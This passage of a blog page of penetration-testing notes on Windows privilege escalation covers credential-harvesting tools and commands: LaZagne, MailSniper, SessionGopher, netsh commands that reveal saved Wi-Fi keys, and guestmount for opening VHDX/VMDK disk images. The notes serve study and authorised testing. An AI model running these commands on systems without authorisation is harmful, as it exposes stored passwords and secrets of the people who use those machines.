</span></pre></table></code></div></div><h3 id="automated-tools"><span class="mr-2">Automated Tools</span><a href="#automated-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="lazagne"><span class="mr-2">LaZagne</span><a href="#lazagne" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The <a href="https://github.com/AlessandroZ/LaZagne">LaZagne</a> project is an open source application used to retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\lazagne.exe</span><span class="w"> </span><span class="nx">all</span><span class="w">
</span></pre></table></code></div></div><h4 id="email"><span class="mr-2">Email</span><a href="#email" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Using the program <a href="https://github.com/dafthack/MailSniper">MailSniper</a>, if we are able to log into a domain-joined system as a domain user with a Microsoft Exchange mailbox, we can try to search the user’s email for words like “pass,” “creds,” “credentials,” etc.</p><h4 id="sessiongopher"><span class="mr-2">SessionGopher</span><a href="#sessiongopher" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>To extract saved <code class="language-plaintext highlighter-rouge">WinSCP</code>, <code class="language-plaintext highlighter-rouge">FileZilla</code>, <code class="language-plaintext highlighter-rouge">SuperPuTTY</code>, <code class="language-plaintext highlighter-rouge">PuTTY</code>, and <code class="language-plaintext highlighter-rouge">RDP</code> credentials, we can use <a href="https://github.com/Arvanaghi/SessionGopher">SessionGopher</a>. The PowerShell-written utility looks for and decrypts remote access tool saved login credentials. It can be executed remotely or locally. It looks up and decrypts any session data it can find by searching the <code class="language-plaintext highlighter-rouge">HKEY USERS</code> hive for all users who have logged into a domain-joined (or standalone) host. Additionally, it may be used to search disks for <code class="language-plaintext highlighter-rouge">RSA</code> (.sdtid), <code class="language-plaintext highlighter-rouge">Remote Desktop</code> (.rdp), and <code class="language-plaintext highlighter-rouge">PuTTY private key</code> files (.ppk).</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SessionGopher.ps1</span><span class="w">
 
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-SessionGopher</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="nx">MACHINE_NAME</span><span class="w">
 
          </span><span class="n">o_</span><span class="w">
         </span><span class="nx">/</span><span class="w">  </span><span class="s2">".   SessionGopher
       ,"</span><span class="w">  </span><span class="nx">_-</span><span class="s2">"
     ,"</span><span class="w">   </span><span class="nx">m</span><span class="w"> </span><span class="nx">m</span><span class="w">
  </span><span class="o">..+</span><span class="w">     </span><span class="p">)</span><span class="w">      </span><span class="n">Brandon</span><span class="w"> </span><span class="nx">Arvanaghi</span><span class="w">
     </span><span class="err">`</span><span class="n">m..m</span><span class="w">       </span><span class="nx">Twitter:</span><span class="w"> </span><span class="err">@</span><span class="nx">arvanaghi</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">arvanaghi.com</span><span class="w">
 
</span><span class="p">[</span><span class="o">+</span><span class="p">]</span><span class="w"> </span><span class="n">Digging</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">MACHINE_NAME...</span><span class="w">
</span><span class="err">&lt;</span><span class="n">SNIP</span><span class="err">&gt;</span><span class="w">
</span></pre></table></code></div></div><h3 id="wifi-passwords"><span class="mr-2">Wifi Passwords</span><a href="#wifi-passwords" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>We can use the <code class="language-plaintext highlighter-rouge">netsh</code> command to show us password of Wifi networks we already connected to. We can first list recent Wi-Fi connections :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profile</span><span class="w">
</span></pre></table></code></div></div><p>And then, we can list the password for a specific Wi-Fi :</p><div class="language-posh highlighter-rouge"><div class="code-header"> <span data-label-text="Posh"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">netsh</span><span class="w"> </span><span class="nx">wlan</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">profile</span><span class="w"> </span><span class="nx">WIFI_NAME</span><span class="w"> </span><span class="nx">key</span><span class="o">=</span><span class="n">clear</span><span class="w">
</span></pre></table></code></div></div><hr /><h2 id="mount-vhdxvmdk"><span class="mr-2">Mount VHDX/VMDK</span><a href="#mount-vhdxvmdk" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Tools such as <a href="https://github.com/SnaffCon/Snaffler">Snaffler</a> can show us some interesting files such as <code class="language-plaintext highlighter-rouge">.vhd</code>, <code class="language-plaintext highlighter-rouge">.vhdx</code>, and <code class="language-plaintext highlighter-rouge">.vmdk</code> files. These are <code class="language-plaintext highlighter-rouge">Virtual Hard Disk</code>, <code class="language-plaintext highlighter-rouge">Virtual Hard Disk v2</code> (both used by Hyper-V), and <code class="language-plaintext highlighter-rouge">Virtual Machine Disk</code> (used by VMware). These three files can be mounted on either our local Linux attack machine or Windows attack machine if we come across any of them. The next commands allow us to mount a share from our Linux attack box or copy across one of these files, allowing us to browse the various operating system files and folders as if we were logged in.</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>guestmount <span class="nt">-a</span> FILE_NAME.vmdk <span class="nt">-i</span> <span class="nt">--ro</span> /mnt/vmdk
</pre></table></code></div></div><p>or</p><div class="language-sh highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>guestmount <span class="nt">--add</span>  FILE_NAME.vhdx  <span class="nt">--ro</span> /mnt/vhdx/ <span class="nt">-m</span> /dev/sda1
</pre></table></code></div></div><p>On our Windows machine we can simply <code class="language-plaintext highlighter-rouge">right-click</code> on the file we want to mount and click on the <code class="language-plaintext highlighter-rouge">Mount</code> option.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/notes/'>Notes</a>, <a href='/categories/privilege-escalation/'>Privilege Escalation</a>, <a href='/categories/windows-pe/'>Windows_PE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web/" class="post-tag no-text-decoration" >Web</a> <a href="/tags/privilege-escalation/" class="post-tag no-text-decoration" >Privilege Escalation</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/pe/" class="post-tag no-text-decoration" >PE</a> <a href="/tags/administrator/" class="post-tag no-text-decoration" >Administrator</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Notes+%7C+Windows+Privilege+Escalation+-+BatBato%27s+Blog&url=nouman404.github.io%2FNotes%2FPrivilege_Escalation%2FWindows_PE" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Notes+%7C+Windows+Privilege+Escalation+-+BatBato%27s+Blog&u=nouman404.github.io%2FNotes%2FPrivilege_Escalation%2FWindows_PE" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=nouman404.github.io%2FNotes%2FPrivilege_Escalation%2FWindows_PE&text=Notes+%7C+Windows+Privilege+Escalation+-+BatBato%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/Notes/AD/AD_Basics">Notes | AD | AD Basics</a><li><a href="/Notes/AD/Tools">Notes | AD | AD Tools</a><li><a href="/CTFs/HeroCTF_2024/Steganographie/Zipper">CTFs | HeroCTF_2024 | Steganographie | Zipper</a><li><a href="/CTFs/HeroCTF_2024/Forensique/LazySysAdmin2">CTFs | HeroCTF_2024 | Forensique | LazySysAdmin2</a><li><a href="/CTFs/HeroCTF_2024/Forensique/Tenant_trouble">CTFs | HeroCTF_2024 | Forensique | Tenant trouble</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/Notes/Privilege_Escalation/Linux_PE"><div class="card-body"> <em class="small" data-ts="1661378400" data-df="ll" > Aug 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Linux Privilege Escalation</h3><div class="text-muted small"><p> Linux PE (Privilege Escalation) Exploiting a bug, a design defect, or a configuration oversight in an operating system or software program to acquire elevated access to resources that are typicall...</p></div></div></a></div><div class="card"> <a href="/CTFs/404CTF_2023/Web/Fuite_en_1791"><div class="card-body"> <em class="small" data-ts="1685916000" data-df="ll" > Jun 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2023 | Web | Fuite en 1791</h3><div class="text-muted small"><p> Fuite en 1791 In this challenge, we arrive on a web page where we can’t access the file because of the link that is expired: Just adding a big expiry date after the signature will give us acc...</p></div></div></a></div><div class="card"> <a href="/CTFs/404CTF_2023/Web/L_Academie_du_detail"><div class="card-body"> <em class="small" data-ts="1685916000" data-df="ll" > Jun 5, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTFs | 404CTF_2023 | Web | L'Académie du détail</h3><div class="text-muted small"><p> L’Académie du détail In this challenge, we arrive on a web page. We have login page available, and we can connect with any credentials we want (ex: a:a). We now have a tab called Liste des membr...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/Notes/Footprinting/Common_Services_Enumeration_&_Attacks" class="btn btn-outline-primary" prompt="Older"><p>Notes | Common Services Enumeration & Attacks</p></a> <a href="/Notes/Web/Common_Web_Attacks" class="btn btn-outline-primary" prompt="Newer"><p>Notes | Common Web Attacks</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2025 <a href="https://github.com/Nouman404/">Bat</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/forensique/">Forensique</a> <a class="post-tag" href="/tags/404ctf/">404CTF</a> <a class="post-tag" href="/tags/stegano/">Stegano</a> <a class="post-tag" href="/tags/fcsc/">FCSC</a> <a class="post-tag" href="/tags/forensic/">Forensic</a> <a class="post-tag" href="/tags/osint/">OSINT</a> <a class="post-tag" href="/tags/stega/">Stega</a> <a class="post-tag" href="/tags/reverse/">Reverse</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
